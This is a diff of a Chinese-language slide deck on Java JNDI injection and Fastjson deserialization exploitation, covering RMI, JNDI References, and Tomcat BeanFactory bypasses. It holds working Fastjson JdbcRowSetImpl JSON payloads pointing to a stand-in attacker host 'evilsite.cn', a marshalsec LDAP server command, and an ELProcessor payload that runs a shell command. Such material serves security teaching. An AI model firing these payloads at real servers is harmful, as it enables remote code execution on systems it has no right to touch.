@@ -120,20 +120,50 @@ Java的反序列化漏洞出现在`readObject()`中，但并不是今天的重�
 Fastjson自身没有使用Java的序列化/反序列化机制，而是自己实现了一套规则
 
 ---
-## JNDI
-* JNDI => Java Naming and Directory Interface
-* Naming Service => (key, value) -> DNS, File System
-* Directory Service => (key, directory objects) -> LDAP
+## RMI
+RMI(Remote Method Invocation)，即远程方法调用，是Java语言层面实现的一种机制，能够在一个JVM上调用另一个JVM的对象的方法。
 
-JNDI是一套接口，类似于索引中心。JNDI允许客户端通过name发现和查找数据以及对象
+举例：A公司是行业翘楚，B公司需要利用A公司的行业优势进行数据处理，但是A公司不能将核心技术部署到B公司，于是A公司在现有架构不变的前提下开发了RMI方法，B公司可以远程调用A公司提供的服务
+
+RMI的构成：
+* Registry - 注册中心
+* RMI Client
+* RMI Server
+
+.footnote[[*] 通常RMI Server和Registry是部署在同一台服务器的]
+---
+
+## JNDI
+
+JNDI(Java Naming and Directory Interface)本质上是一套接口，对具体服务进行统一封装
 
 这些对象可以存储在不同的服务中，例如：
 * 远程方法调用（RMI）
 * 通用对象请求代理体系结构（CORBA）
 * 轻型目录访问协议（LDAP）
-* 域名服务（DNS）
 
 .footnote[[*] Blackhat 2016 - A Journey From JNDI LDAP Manipulation To RCE]
+
+.image-scale[![](./img/jndiarch.gif)]
+
+---
+## JNDI对RMI的扩展
+在远程方法调用过程中，会涉及数据的序列化和反序列化：入参需要序列化才能发送到远程JVM、方法执行结果需要反序列化才能还原成原来的对象
+
+但有很多时候序列化和反序列化不能满足需求，因为：
+* 一些对象在序列化后体积过大
+* 并非所有对象都可以进行序列化，只传输可以序列化的对象不能满足开发需求
+
+JNDI对RMI进行了扩展，定义出一种新的对象：Reference
+
+Reference是对远程对象的引用，其中存储了远程对象的位置信息。因此使用JNDI接口可以绑定两种对象：
+1. Remote Object
+2. Reference
+
+---
+## JNDI-RMI的流程与攻击面
+.image-scale[![](./img/RMI.png)]
+
 ---
 注册一个资源
 ```java
@@ -145,8 +175,8 @@ import java.rmi.registry.Registry;
 
 public class Server {
     public static void main(String[] args) throws Exception {
-*        Registry registry = LocateRegistry.createRegistry(1099);
-*        Reference aa = new Reference("ExecTest", "ExecTest", "http://127.0.0.1:8081");
+*       Registry registry = LocateRegistry.createRegistry(1099);
+*       Reference aa = new Reference("ExecTest", "ExecTest", "http://127.0.0.1:8081");
         ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
         registry.bind("aa", refObjWrapper);
     }
@@ -167,9 +197,9 @@ public class Client {
         Hashtable env = new Hashtable();
         env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
         env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
-*        String uri = "rmi://127.0.0.1:1099/aa";
+*       String uri = "rmi://127.0.0.1:1099/aa";
         Context ctx = new InitialContext(env);
-*        ctx.lookup(uri);
+*       ctx.lookup(uri);
     }
 }
 ```
@@ -196,6 +226,7 @@ Caused by: java.lang.ClassCastException: ExecTest cannot be cast to javax.naming
 	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
     ... 4 more
 ```
+
 
 ---
 ```java
@@ -262,10 +293,10 @@ if (ref != null) {
 // client
 Hashtable env = new Hashtable();
         env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
-*        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1389");
+*       env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1389");
         System.getProperties().setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
         System.getProperties().setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-*        String uri = "ldap://localhost:1389/obj";
+*       String uri = "ldap://evilsite.cn:1389/obj";
         Context ctx = new InitialContext(env);
         ctx.lookup(uri);
 ```
@@ -407,7 +438,7 @@ JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly的默认值就是true，
 
 Payload
 ```json
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/ExexTest","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evilsite.cn:1099/ExexTest","autoCommit":true}
 ```
 
 利用核心：com.sun.rowset.JdbcRowSetImpl类
@@ -456,7 +487,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 ```
 Payload
 ```json
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evilsite.cn:1389/Exploit", "autoCommit":true}
 ```
 核心点：JNDI注入时存在协议动态切换特性
 
@@ -477,9 +508,27 @@ Payload
 
 ---
 ## RMI BeanFactory
+刚才提到，JDK在高版本上默认禁用了JNDI Reference远程加载Object Factory，这里的绕过方法是在RMI绑定服务器本地环境中可以利用的类。在Tomcat中存在`org.apache.naming.factory.BeanFactory`类符合利用条件
+
+RMI服务器绑定BeanFactory
+```java
+public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
+    Registry registry = LocateRegistry.createRegistry(1099);
+    ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+    ref.add(new StringRefAddr("forceString", "x=eval"));
+    ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/System/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
+    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+    registry.bind("Object", referenceWrapper);
+}
+```
+发送的JSON：
+```json
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evilsite.cn:1099/ExexTest","autoCommit":true}
+```
 
 ---
 ## LDAP Java Serialized Data
+在BlackHat2016的演讲中还提到过LDAP可以返回Java Serialized Data，当对象的javaSerilizedData属性非空时，obj.decodeObject方法会直接对字段内容进行反序列化
 
 ---
 ## 特殊类
